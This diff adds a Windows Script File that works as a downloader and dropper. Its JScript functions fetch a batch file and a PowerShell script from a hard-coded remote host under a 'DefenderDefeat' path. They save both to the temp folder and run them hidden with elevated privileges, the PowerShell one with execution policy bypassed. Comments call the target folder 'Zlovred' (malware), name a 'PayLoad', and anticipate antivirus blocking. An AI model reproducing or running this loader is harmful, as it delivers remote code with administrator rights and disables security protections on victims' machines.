@@ -1,0 +1,592 @@
+<?xml version="1.0" encoding="Windows-1251"?>
+<!-- ***************************** -->
+<!-- File wsf -->
+<!-- AllDefeatDownload-002.wsf -->
+<!--
+This Script Downloads Batch File to
+Temporary Directory and Runs it with Elevated Privileges-->
+-->
+<!-- ***************************** -->
+<job id="ID1">
+	<script language="JScript">
+	<![CDATA[
+	/* *********************************************************
+	'
+	' This Script Downloads Batch File to
+	' Temporary Directory and Runs it with Elevated Privileges
+	'
+	* *********************************************************/
+	/* *********************************************************
+	'
+	' CmdDownlRun01( strURL , iTimeOut )
+	'
+	' This Script Downloads Exe file from strURL Path and
+	' Execute it with Script TimeOut in iTimeOut ms
+	'
+	' PARAMETERS:	strURL � URL Path to Download
+	'				iTimeOut � Wait to End Execution of the File
+	' 				strFileNameExe - Name of Exe File
+	' RETURNS:		0 if Success Download and Run
+	'				1 if Error Occur
+	'
+	* *********************************************************/
+	function CmdDownlRun(strURL, iTimeOut, strFileNameExe) {
+		var iFlag;
+		var tempFolder;
+		// Get Temp Folder Name
+		tempFolder = getTempEnviron();
+		iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
+		if(iFlag != 0) return 1;
+		iFlag = RunDownloadedCmd(tempFolder, strFileNameExe, iTimeOut);
+		if(iFlag != 0) return 1;
+		return 0;
+	}
+	/* *********************************************************
+	'
+	' ScriptDownlRun(strURL, iTimeOut, strFileNameExe)
+	'
+	' This Script Downloads WSH file from strURL Path and
+	' Execute it with Script TimeOut in iTimeOut ms
+	'
+	' PARAMETERS:	strURL -- URL Path to Download
+	'				iTimeOut -- Wait to End Execution of the File
+	' 				strFileNameExe - Name of WSH File
+	' RETURNS:		0 if Success Download and Run
+	'				1 if Error Occur
+	'
+	* *********************************************************/
+	function ScriptDownlRun(strURL, iTimeOut, strFileNameExe) {
+		var iFlag;
+		var tempFolder;
+		// Get Temp Folder Name
+		tempFolder = getTempEnviron();
+		iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
+		if(iFlag != 0) return 1;
+		iFlag = RunDownloadedScript(tempFolder, strFileNameExe, iTimeOut);
+		if(iFlag != 0) return 1;
+		return 0;
+	}
+	/* *********************************************************
+	'
+	' CmdRun01( strRelPath, iTimeOut )
+	'
+	' This Script Runs Command file from Relative Path and
+	' with Script TimeOut in iTimeOut ms
+	'
+	' PARAMETERS:	strRelPath - Relative Path to Run
+	'				iTimeOut - Wait to End Execution of the File
+	' 				strFileNameExe - Name of Exe File
+	' RETURNS:		0 if Success Download and Run
+	'				1 if Error Occur
+	'
+	* *********************************************************/
+	function CmdRun01(strRelPath, iTimeOut, strFileNameExe) {
+		var iFlag;
+		var tempFolder;
+		// Get Temp Folder Name
+  	tempFolder = getCurrentDirectory();
+  	// Check if strFolder is Empty of TEMP Directory not Assigned
+  	if(tempFolder === "") {
+    		return 1;
+  	}
+  	iFlag = 1;
+  	tempFolder = tempFolder + "\\" + strRelPath;
+  	// WScript.Echo("Relative path = " + tempFolder );
+		iFlag = RunDownloadedCmd(tempFolder, strFileNameExe, iTimeOut);
+		if(iFlag != 0) return 1;
+		return 0;
+	}
+	/* *********************************************************
+	'
+	' PwshDownlRun( strURL , iTimeOut, strFileNameExe )
+	'
+	' This Script Downloads Powershell file from strURL Path and
+	' Execute it with Script TimeOut in iTimeOut ms
+	'
+	' PARAMETERS:	strURL -- URL Path to Download
+	'				iTimeOut -- Wait to End Execution of the File
+	' 				strFileNameExe -- Name of PowerShell File
+	' RETURNS:		0 if Success Download and Run
+	'				1 if Error Occur
+	'
+	* *********************************************************/
+	function PwshDownlRun(strURL, iTimeOut, strFileNameExe) {
+		var iFlag;
+		var tempFolder;
+		// Get Temp Folder Name
+		tempFolder = getTempEnviron();
+		iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
+		if(iFlag != 0) return 1;
+		iFlag = RunDownloadedPwsh(tempFolder, strFileNameExe, iTimeOut);
+		if(iFlag != 0) return 1;
+		return 0;
+	}
+	/* *********************************************************
+	'
+	' PwshRun01( strRelPath , iTimeOut )
+	'
+	' This Script Runs Powershell file from strRelPath Path and
+	' with Script TimeOut in iTimeOut ms
+	'
+	' PARAMETERS:	strRElPath - URL Path to Download
+	'				iTimeOut - Wait to End Execution of the File
+	' 				strFileNameExe - Name of Exe File
+	' RETURNS:		0 if Success Download and Run
+	'				1 if Error Occur
+	'
+	* *********************************************************/
+	function PwshRun01(strRelPath, iTimeOut, strFileNameExe) {
+		var iFlag;
+		var tempFolder;
+		// Get Temp Folder Name
+  	tempFolder = getCurrentDirectory();
+  	// Check if strFolder is Empty of TEMP Directory not Assigned
+  	if(tempFolder === "") {
+    		return 1;
+  	}
+  	iFlag = 1;
+  	tempFolder = tempFolder + "\\" + strRelPath;
+  	// WScript.Echo("Relative path = " + tempFolder );
+		iFlag = RunDownloadedPwsh(tempFolder, strFileNameExe, iTimeOut);
+		if(iFlag != 0) return 1;
+		return 0;
+	}
+	/* *********************************************************
+	'
+	' FileDownl( strURL , strFileNameExe )
+	'
+	' This Script Downloads a file from strURL Path
+	'
+	' PARAMETERS:	strURL � URL Path to Download
+	' 				strFileNameExe - Name of a File
+	' RETURNS:		0 if Success Download and Run
+	'				1 if Error Occur
+	'
+	* *********************************************************/
+	function FileDownl(strURL, strFileNameExe) {
+		var iFlag;
+		var tempFolder;
+		// Get Temp Folder Name
+		tempFolder = getTempEnviron();
+		iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
+		if(iFlag != 0) return 1;
+		return 0;
+	}
+
+/* *****************************************************************************
+'
+' getTempEnviron()
+' This Function Returns the Path for User Variable TEMP
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path for Zlovred Directory if Exists or
+'               Path for User Variable %TEMP% if Success or
+'               "C:\Windows\Temp" if API Error or
+'				"" if General Sysytem Error
+'
+' *****************************************************************************/
+function getTempEnviron() {
+	var fso, wsh, envProc, envSys;
+	var strZlFolder; // Zlovred Temprorary Folder
+	// Define ActiveX Objects
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	// Define Process Environment Variable
+	envProc = wsh.Environment("PROCESS");
+	// Define System Environment Variable
+	envSys = wsh.Environment;
+	// Define Zlovred Temprorary Folder
+	strZlFolder = "C:\\pub1\\Distrib\\Zlovred";
+	// Define and Check Environment Variables
+	var envVariable;
+	envVariable = strZlFolder;
+	if(!fso.FolderExists(envVariable)) {
+		envVariable = envProc("TEMP");
+		if(!fso.FolderExists(envVariable)) {
+			envVariable = envSys("TMP");
+			if(!fso.FolderExists(envVariable)) {
+				envVariable = "";
+			}
+		}
+	}
+	return envVariable;
+}
+
+/* *********************************************************
+'
+' getCurrentDirectory()
+' This Function Returns the Path for Current Directory
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path For Current Directory if Success
+'       "" if General Sysytem Error
+'
+* *********************************************************/
+function getCurrentDirectory() {
+  var fso, wsh, cur_dir;
+  // Define ActiveX Objects
+  fso = new ActiveXObject("Scripting.FileSystemObject");
+  wsh = new ActiveXObject("WScript.Shell");
+  // Define Current Directory
+  cur_dir = wsh.CurrentDirectory
+  // Run Algorythm
+  var envVariable;
+  envVariable = cur_dir;
+  if(!fso.FolderExists(envVariable)) {
+      envVariable = "";
+  }
+  return envVariable;
+}
+	/* *********************************************************
+	 * Function getXmlHttp02
+	 * This Function Registers XMLHTTP Object both at
+	 * Windows Script Shell and at Web Browswers
+	 * If Object can't Register it Returns Empty String
+	 *
+	 * PARAMETERS:  NONE
+	 * RETURNS:     XMLHTTP Object if Success
+	 *              Empty String if no COM Object Registred
+	* *********************************************************/
+	function getXmlHttp02() {
+		// body...
+		try {
+			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
+			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
+			//return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
+			return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
+		} catch (e) {
+			try {
+				// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
+				return new ActiveXObject("MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
+			} catch (ee) {
+				try {
+					// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
+					return new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
+					// return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
+				} catch (eee) {
+					try {
+						return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
+					} catch (eeee) {}
+				}
+			}
+		}
+		if(typeof XMLHttpRequest != "undefined") {
+			// statement
+			return new XMLHttpRequest(); // for Web Browsers
+		} else {
+			// statement
+			return "";
+		}
+	}
+	
+	/* *********************************************************
+	'
+	' UploadFilesFromInt( strFile, strURL, strPath )
+	' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
+	' and Save it on Local Computer to Path strPath
+	' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
+	'
+	' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
+	'               strURL -- an URL of the web-site, from which the File
+	'               is Downloaded
+	'               strPath -- a Place in a Windows Computer (Full path without slash)
+	'               in which the File is Downloaded
+	'
+	' RETURNS:      0 -- If File is Normally Downloaded and Created
+	'               1 -- if File in Path strPath Can't Create
+	'               2 -- if XMLHTTP or ADOStream Can't Initialize
+	'				3 -- if Emty HTTP Responce or Send Access Denied
+	'				4 -- if HTTP Response Not 200 (while is not make)
+	'
+	* *********************************************************/
+	function UploadFilesFromInt(strFile, strURL, strPath) {
+		var fso, xmlHttp, adoStream;
+		// Define FileSystemObject
+		try {
+			fso = new ActiveXObject("Scripting.FileSystemObject");
+		} catch (e) {
+			return 1;
+		}
+		// Define XMLHTTP Help Object
+		xmlHttp = getXmlHttp02();
+		if(xmlHttp === "") {
+			return 2;
+		}
+		// Define Adodb.Stream Object
+		try {
+			adoStream = new ActiveXObject("Adodb.Stream");
+		} catch (e) {
+			return 2;
+		}
+		var strFileURL;
+		var strLocal_Path;
+		var intUploadFilesFromInt;
+		var blnExistRemoteFile;
+		var cb = [];
+		// Define Full Downloaded File URL
+		strFileURL = strURL + strFile;
+		// Define Full Local Path to be Downloaded
+		strLocal_Path = strPath + "\\" + strFile;
+		// Check if Path is Exist
+		if(fso.FolderExists(strPath)) intUploadFilesFromInt = 0;
+		else intUploadFilesFromInt = 1;
+		// Downloaded File
+		// Open URL (Get Requiest synchronous)
+		try {
+			xmlHttp.Open("GET", strFileURL, false);
+		} catch (e) {
+			WScript.Echo("Can't Open URL: " + strFileURL + "\nError: " + e);
+			return 3;
+		}
+		// Set User-Agent Header (for Safari Browser)
+		xmlHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
+		// Define Function onreadystatechange
+		xmlHttp.onreadystatechange = function() {
+			if(xmlHttp.readyState === 4) {
+				cb[0] = xmlHttp.status; // Status of Request (Integer Number)
+				cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
+				cb[2] = xmlHttp.responseText; // Response Text
+				cb[3] = xmlHttp.responseBody; // Response Body
+			}
+		};
+		// Send File from URL
+		try {
+			xmlHttp.Send();
+		} catch (e) {
+			WScript.Echo("Can't make Send() Request!\nMay be Block with Antivirus?");
+			return 3;
+		}
+		if(cb[0] == 200 && intUploadFilesFromInt == 0)
+			// If Send Request is Successful
+			blnExistRemoteFile = true;
+		else {
+			blnExistRemoteFile = false;
+			intUploadFilesFromInt = 4;
+			WScript.Echo("Wrong HTTP Status:" + cb[0] + "\mURL = " + strFileURL);
+			xmlHttp.Abort();
+		}
+		if(blnExistRemoteFile) {
+			// Set AdoStream Type mode and Open It
+			adoStream.Type = 1;
+			adoStream.Mode = 3;
+			adoStream.Open();
+			// Write to AdoStream Response Body of HTTP Request
+			adoStream.Write(cb[3]);
+			// Save Stream to File
+			try {
+				adoStream.SaveToFile(strLocal_Path, 2);
+			} catch (e) {
+				WScript.Echo("Can't Save File Stream into File: " + strLocal_Path + "\nCheck Access Rights!");
+				intUploadFilesFromInt = 1;
+			}
+			// /Downloaded File
+			// Close Objects
+			adoStream.Close();
+			xmlHttp.Abort();
+			// Check If File Downloaded
+			if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0) intUploadFilesFromInt = 1;
+			// /Check if File Downloaded
+		}
+		return intUploadFilesFromInt;
+	}
+/******************************************************************************
+'
+' RunDownloadedScript( strPath, strVBS, intTimeOut )
+' This Function Run Hidden a strVBS File
+' with Command "cscript //NoLogo " & strPath & "\" & strVBS
+'
+' PARAMETERS:   strPath -- The Path to strVBS
+'               strVBS -- a VBS File with instructions
+'               (Windows Scripts Shell)
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function RunDownloadedScript(strPath, strVBS, intTimeOut) {
+	var constRun_VBS, constOpt;
+	// Define Windows Scripts Options
+	constRun_VBS = "//Nologo ";
+	// Define VBS Script Options (Empty)
+	constOpt = "";
+	var strValue, shApp, fso, wsh, envProc, pathCMD;
+	// Define ActiveX Object
+	shApp = new ActiveXObject("Shell.Application");
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	pathCMD = envProc("SystemRoot") + "\\System32";
+	// Check Paths
+	if(!fso.FileExists(pathCMD + "\\cscript.exe")) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strVBS)) {
+		return 1
+	};
+	// Set Cscript Command Arguments
+	strValue = constRun_VBS + "\"" + strPath + "\\" + strVBS + "\"" + constOpt;
+	// Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+	shApp.ShellExecute(pathCMD + "\\cscript.exe", strValue, strPath, "runas", 0);
+	//    setTimeout( DoNothing, intTimeOut );
+	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
+	WScript.Sleep(intTimeOut);
+	return 0;
+}
+
+	/* *********************************************************
+	'
+	' RunDownloadedCmd( strPath, strCmd, iTimeOut )
+	' This Function Run a strCmd Command File File
+	' with Command cmd /c "strPath & "\" & strVBS "
+	'
+	' PARAMETERS:   strPath -- The Path to strVBS
+	'               strVBS -- a VBS File with instructions
+	'               (Windows Scripts Shell)
+	'				intTimeOut -- Estimated Time for Running (ms)
+	'
+	' RETURNS:      0 if Success
+	'	`			1 if Path Not Found
+	'
+	* *********************************************************/
+	function RunDownloadedCmd(strPath, strCmd, intTimeOut) {
+		var constOpt;
+		// Define Command Options (Empty)
+		constOpt = "";
+		var preArgs; // Previously Arguments of cmd.exe
+		preArgs = "/c ";
+		var strValue, shApp, wsh, envProc, pathCMD, fso;
+		// Define ActiveX Object
+		shApp = new ActiveXObject("Shell.Application");
+		fso = new ActiveXObject("Scripting.FileSystemObject");
+		wsh = new ActiveXObject("WScript.Shell");
+		//Define Command Path Variable
+		envProc = wsh.Environment("PROCESS");
+		pathCMD = envProc("SystemRoot") + "\\System32";
+		// Set cmd.exe Command Arguments
+		strValue = preArgs + "\"" + strPath + "\\" + strCmd + "\" " + constOpt;
+		// Check If Path Exists
+		if(!fso.FileExists(strPath + "\\" + strCmd)) return 1;
+		if(!fso.FileExists(pathCMD + "\\cmd.exe")) return 1;
+		// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+		shApp.ShellExecute(pathCMD + "\\cmd.exe", strValue, strPath, "runas", 0);
+		// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
+		WScript.Sleep(intTimeOut);
+		return 0;
+	}
+
+/******************************************************************************
+'
+' RunDownloadedPwsh( strPath, strPwsh, intTimeOut )
+' This Function Run Hidden a strPwsh File
+' with Command "powershell -NoProfile -ExecutionPolicy Bypass -File " & strPath & "\" & strPwsh
+'
+' PARAMETERS:   strPath -- The Path to strPwsh
+'               strPwsh -- a PS1 File with instructions
+'               (Windows PowerShell)
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function RunDownloadedPwsh( strPath, strPwsh, intTimeOut ) {
+	var constRun_Pwsh, constOpt;
+	// Define Windows Scripts Options
+	constRun_Pwsh = " -NoProfile -ExecutionPolicy Bypass -File ";
+	var strValue, shApp, fso, wsh, envProc, pathCMD, aWPWSH;
+	// Define ActiveX Object
+	shApp = new ActiveXObject("Shell.Application");
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	pathCMD = envProc("SystemRoot") + "\\System32";
+	aWPWSH = pathCMD + "\\WindowsPowerShell\\v1.0\\powershell.exe";
+	// Check Paths
+	if(!fso.FileExists(aWPWSH)) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strPwsh)) {
+		return 1
+	};
+	// Set Cscript Command Arguments
+	strValue = constRun_Pwsh + "\"" + strPath + "\\" + strPwsh + "\"";
+	// Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+	shApp.ShellExecute(aWPWSH, strValue, strPath, "runas", 0);
+	//    setTimeout( DoNothing, intTimeOut );
+	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
+	WScript.Sleep(intTimeOut);
+	return 0;
+}
+
+	/* *********************************************************
+	'
+	' PayLoad()
+	'
+	' This Script Run First Payload (TinyExclusions)
+	'
+	' PARAMETERS:	NONE;
+	' RETURNS:		0 if Success Download and Run
+	'				2 if Error Occur
+	'
+	* *********************************************************/
+	function PayLoad() {
+		var iFlag; // Temprorary Variable
+		// ### Declare User Variables ###
+		//
+		var strHackCmd01; // Short Execution File Name
+		var strHackURL, strHackURLMain; // URL from Download
+		var strHackPwsh01;
+		// ### Define Global Variables ###
+		//
+		strHackCmd01 = "AllDef-CheckLoad-002.bat";
+		strHackPwsh01 = "Set-DownloadProtect-002.ps1";
+		// Define URL variables
+		//
+		var http_Pref, http_Host, http_Port, http_Path
+		http_Pref = "http";
+		http_Host = "file.netip4.ru";
+		http_Port = "80";
+		http_Path = "/PROGS/NIT/DefenderDefeat/Check/";
+		
+		// Define Temporary Variables
+		var iTimeOut01, iTimeOut02;
+		
+		// ### Time Out PowerShell 3 minutes ###
+		// ###
+		iTimeOut01 = 180000;
+		
+		// ### Time Out AllDefeat 7 minutes ###
+		// ###
+		iTimeOut02 = 420000;
+		
+		// ### Define Derivative Variables
+		//
+		strHackURL = http_Pref + "://" + http_Host + ":" + http_Port + http_Path;
+
+		// ### Run Algorythm
+
+		iFlag = 1;
+		iFlag = PwshDownlRun( strHackURL, iTimeOut01, strHackPwsh01 );
+		if( iFlag == 1 ) return 2;
+		iFlag = CmdDownlRun(strHackURL, iTimeOut02, strHackCmd01);
+		if(iFlag == 1) return 2;
+		else return 0;
+	}
+
+	]]>
+	</script>
+	<script language="VBScript">
+	<![CDATA[
+	Dim iFlag
+	iFlag = Payload()
+	If iFlag = 0 Then
+		WScript.Echo "Success Script Run!"
+	ElseIf iFlag = 1 Then
+		WScript.Echo "Folder Already Exists."
+	ElseIf iFlag = 2 Then
+		WScript.Echo "Error Download and Execute Script!"
+	End If
+	]]>
+	</script>
+</job>
